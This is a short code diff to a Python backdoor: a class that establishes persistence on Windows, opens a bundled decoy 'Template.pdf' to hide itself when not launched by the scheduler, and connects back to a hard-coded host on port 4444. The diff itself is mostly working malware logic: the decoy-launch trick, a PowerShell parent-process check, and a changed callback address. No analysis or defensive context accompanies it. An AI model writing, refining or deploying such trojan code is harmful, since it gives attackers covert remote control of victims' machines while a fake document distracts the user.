@@ -28,6 +28,15 @@ class Backdoor:
             self.reliable_send("[-] Non-Windows OS detected\n[-] Unable to establish persistence")
             return
 
+        parent_PID = os.getppid()
+        cmd = 'powershell -c "Get-Process | findstr "'+str(parent_PID)
+        parent_process_details = str(self.exec_system_cmd(cmd).decode('utf-8'))
+        if "scheduler" not in parent_process_details:
+            file_name = sys._MEIPASS + "\Template.pdf"
+            subprocess.call(file_name, shell = True)
+
+
+
         data = ""
         data = data + "[+] Windows OS detected\n[+] Continuing with Persistence Operations"
         
@@ -107,11 +116,9 @@ class Backdoor:
 
 #------------------------------------MAIN--------------------------------------#
 
-file_name = sys._MEIPASS + "\Template.pdf"
-subprocess.call(file_name, shell = True)
 
 try:
-    backdoor = Backdoor("192.168.1.39",4444)
+    backdoor = Backdoor("10.124.7.108",4444)
     backdoor.run()
 except:
     sys.exit(0)
